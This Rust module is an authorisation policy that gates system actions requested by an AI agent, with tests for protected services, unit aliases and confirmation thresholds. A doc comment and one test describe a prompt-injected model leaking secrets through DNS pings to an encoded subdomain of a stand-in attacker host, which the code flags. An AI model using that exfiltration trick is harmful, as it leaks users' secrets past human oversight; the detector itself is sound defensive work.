//! Authorisation: given a validated action, allow it, demand confirmation, or deny it.

use core_protocol::wire::Capability;
use core_protocol::{Action, CATALOG, Executor, Risk, ValidatedAction};

use crate::config::GuardianConfig;
use crate::planner::SystemProbe;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Confirm { risk: Risk },
    Deny { reason: String },
}

pub struct Policy<'a> {
    config: &'a GuardianConfig,
    /// Resolves unit aliases (`autovt@tty1` is `getty@tty1`) so protection cannot be
    /// sidestepped by naming a unit differently.
    probe: Option<&'a dyn SystemProbe>,
}

impl<'a> Policy<'a> {
    pub fn new(config: &'a GuardianConfig) -> Self {
        Policy { config, probe: None }
    }

    pub fn with_probe(config: &'a GuardianConfig, probe: &'a dyn SystemProbe) -> Self {
        Policy { config, probe: Some(probe) }
    }

    pub fn effective_risk(&self, name: &str, default: Risk) -> Risk {
        self.config.actions.risk.get(name).copied().unwrap_or(default)
    }

    pub fn is_disabled(&self, name: &str) -> bool {
        self.config.actions.disabled.iter().any(|d| d == name)
    }

    fn needs_confirmation(&self, name: &str, risk: Risk) -> bool {
        let a = &self.config.actions;
        if a.never_confirm.iter().any(|n| n == name) {
            return false;
        }
        a.always_confirm.iter().any(|n| n == name) || risk > self.config.auto_approve
    }

    pub fn authorize(&self, v: &ValidatedAction) -> Decision {
        let name = v.name();
        if self.is_disabled(name) {
            return Decision::Deny { reason: format!("{name} is disabled by the system policy") };
        }
        if let Err(reason) = self.check_specifics(&v.action) {
            return Decision::Deny { reason };
        }
        let risk = self.effective_risk(name, v.risk()).max(argument_risk(&v.action));
        if self.needs_confirmation(name, risk) { Decision::Confirm { risk } } else { Decision::Allow }
    }

    /// Argument-dependent rules: forbidden and protected units, protected packages, pids.
    fn check_specifics(&self, action: &Action) -> Result<(), String> {
        use Action::*;
        let unit = match action {
            ServiceStatus { .. } => None, // inspecting anything is fine
            StartService { service }
            | RestartService { service }
            | StopService { service }
            | EnableService { service, .. }
            | DisableService { service, .. } => Some(service.as_str()),
            _ => None,
        };
        if let Some(unit) = unit {
            let names = self.unit_names(unit);
            if names.iter().any(|n| self.is_forbidden_unit(n)) {
                return Err(format!(
                    "{unit} controls the power state or rescue mode; use the reboot or poweroff actions instead"
                ));
            }
            let stops = matches!(action, RestartService { .. } | StopService { .. } | DisableService { .. });
            if stops && names.iter().any(|n| self.is_protected_service(n)) {
                return Err(format!("{unit} is a protected system service and cannot be stopped or restarted"));
            }
        }
        match action {
            RemovePackage { package } if self.config.packages.protected.iter().any(|p| p == package.as_str()) => {
                Err(format!("{package} is essential to the system and cannot be removed"))
            }
            KillProcess { pid, .. } if *pid == std::process::id() => {
                Err("refusing to signal the Guardian itself".into())
            }
            _ => Ok(()),
        }
    }

    /// The name as given plus, when a probe is available, the unit it resolves to.
    fn unit_names(&self, unit: &str) -> Vec<String> {
        let mut names = vec![unit.to_string()];
        if let Some(resolved) = self.probe.and_then(|p| p.unit_id(unit)) {
            if !names.contains(&resolved) {
                names.push(resolved);
            }
        }
        names
    }

    fn matches_unit(list: &[String], unit: &str) -> bool {
        let base = unit.strip_suffix(".service").unwrap_or(unit);
        list.iter().any(|p| p == unit || p == base)
    }

    pub fn is_protected_service(&self, unit: &str) -> bool {
        Self::matches_unit(&self.config.services.protected, unit)
    }

    pub fn is_forbidden_unit(&self, unit: &str) -> bool {
        Self::matches_unit(&self.config.services.forbidden, unit)
    }

    /// The Guardian-executed actions this policy accepts.
    pub fn capabilities(&self) -> Vec<Capability> {
        CATALOG
            .iter()
            .filter(|s| s.executor == Executor::Guardian && !self.is_disabled(s.name))
            .map(|s| {
                let risk = self.effective_risk(s.name, s.risk);
                Capability {
                    action: s.name.to_string(),
                    risk,
                    requires_confirmation: self.needs_confirmation(s.name, risk),
                }
            })
            .collect()
    }
}

/// Risk raised by the arguments themselves.
///
/// A prompt-injected model could leak data through DNS by "pinging"
/// `<encoded-secret>.attacker.example`. Ordinary hostnames are short and shallow, so
/// unusual ones need a human to look at them.
fn argument_risk(action: &Action) -> Risk {
    match action {
        Action::PingHost { host, .. } if suspicious_hostname(host.as_str()) => Risk::Medium,
        _ => Risk::Observe,
    }
}

pub fn suspicious_hostname(host: &str) -> bool {
    if host.parse::<std::net::IpAddr>().is_ok() {
        return false;
    }
    let labels: Vec<&str> = host.trim_end_matches('.').split('.').collect();
    host.len() > 48 || labels.len() > 5 || labels.iter().any(|l| l.len() > 24)
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use core_protocol::Intent;
    use serde_json::json;

    use super::*;

    fn decide(config: &GuardianConfig, action: &str, args: serde_json::Value) -> Decision {
        let v = ValidatedAction::from_intent(&Intent::new(action, args)).unwrap();
        Policy::new(config).authorize(&v)
    }

    struct Aliases;
    impl SystemProbe for Aliases {
        fn wireless_interfaces(&self) -> Vec<String> {
            vec![]
        }
        fn filesystem_type(&self, _: &Path) -> Option<String> {
            None
        }
        fn unit_id(&self, unit: &str) -> Option<String> {
            match unit {
                "autovt@tty1" | "autovt@tty1.service" => Some("getty@tty1.service".into()),
                "dbus-org.freedesktop.login1.service" => Some("systemd-logind.service".into()),
                "halt-alias" => Some("systemd-halt.service".into()),
                other => Some(format!("{other}.service").replace(".service.service", ".service")),
            }
        }
    }

    #[test]
    fn risk_threshold() {
        let c = GuardianConfig::default();
        assert_eq!(decide(&c, "disk_usage", json!({})), Decision::Allow);
        assert_eq!(decide(&c, "restart_service", json!({"service": "bluetooth"})), Decision::Allow);
        assert_eq!(
            decide(&c, "enable_service", json!({"service": "bluetooth"})),
            Decision::Confirm { risk: Risk::Medium }
        );
        assert_eq!(decide(&c, "install_package", json!({"package": "w3m"})), Decision::Confirm { risk: Risk::High });
    }

    #[test]
    fn overrides() {
        let mut c = GuardianConfig::default();
        c.actions.disabled.push("poweroff".into());
        c.actions.always_confirm.push("set_volume".into());
        c.actions.risk.insert("set_hostname".into(), Risk::Low);
        assert!(matches!(decide(&c, "poweroff", json!({})), Decision::Deny { .. }));
        assert!(matches!(decide(&c, "set_volume", json!({"percent": 5})), Decision::Confirm { .. }));
        assert_eq!(decide(&c, "set_hostname", json!({"hostname": "x"})), Decision::Allow);
    }

    #[test]
    fn protected_services_and_packages() {
        let c = GuardianConfig::default();
        assert!(matches!(decide(&c, "stop_service", json!({"service": "dbus.service"})), Decision::Deny { .. }));
        assert!(matches!(decide(&c, "restart_service", json!({"service": "core-guardian"})), Decision::Deny { .. }));
        // Inspecting or starting a protected service is fine.
        assert_eq!(decide(&c, "service_status", json!({"service": "dbus"})), Decision::Allow);
        assert_eq!(decide(&c, "start_service", json!({"service": "dbus"})), Decision::Allow);
        assert!(matches!(decide(&c, "remove_package", json!({"package": "glibc"})), Decision::Deny { .. }));
    }

    #[test]
    fn power_units_cannot_be_started_as_services() {
        let c = GuardianConfig::default();
        for unit in ["systemd-poweroff", "systemd-reboot.service", "emergency", "rescue.service", "systemd-suspend"] {
            assert!(matches!(decide(&c, "start_service", json!({"service": unit})), Decision::Deny { .. }), "{unit}");
        }
    }

    #[test]
    fn aliases_resolve_to_protected_units() {
        let c = GuardianConfig::default();
        let probe = Aliases;
        let policy = Policy::with_probe(&c, &probe);
        let check = |action: &str, unit: &str| {
            let v = ValidatedAction::from_intent(&Intent::new(action, json!({"service": unit}))).unwrap();
            policy.authorize(&v)
        };
        assert!(matches!(check("restart_service", "autovt@tty1"), Decision::Deny { .. }));
        assert!(matches!(check("stop_service", "dbus-org.freedesktop.login1.service"), Decision::Deny { .. }));
        assert!(matches!(check("start_service", "halt-alias"), Decision::Deny { .. }));
        assert_eq!(check("restart_service", "bluetooth"), Decision::Allow);
    }

    #[test]
    fn exfiltration_shaped_hostnames_need_confirmation() {
        let c = GuardianConfig::default();
        assert_eq!(decide(&c, "ping_host", json!({"host": "archlinux.org"})), Decision::Allow);
        assert_eq!(decide(&c, "ping_host", json!({"host": "1.1.1.1"})), Decision::Allow);
        assert_eq!(
            decide(&c, "ping_host", json!({"host": "6b65792d6d6174657269616c2d686572.evil.example"})),
            Decision::Confirm { risk: Risk::Medium }
        );
        assert!(suspicious_hostname("a.b.c.d.e.f.example"));
    }

    #[test]
    fn capabilities_cover_guardian_actions_only() {
        let mut c = GuardianConfig::default();
        c.actions.disabled.push("reboot".into());
        let caps = Policy::new(&c).capabilities();
        assert!(caps.iter().all(|c| c.action != "respond" && c.action != "reboot" && c.action != "read_file"));
        let install = caps.iter().find(|c| c.action == "install_package").unwrap();
        assert!(install.requires_confirmation);
        let du = caps.iter().find(|c| c.action == "disk_usage").unwrap();
        assert!(!du.requires_confirmation);
    }
}
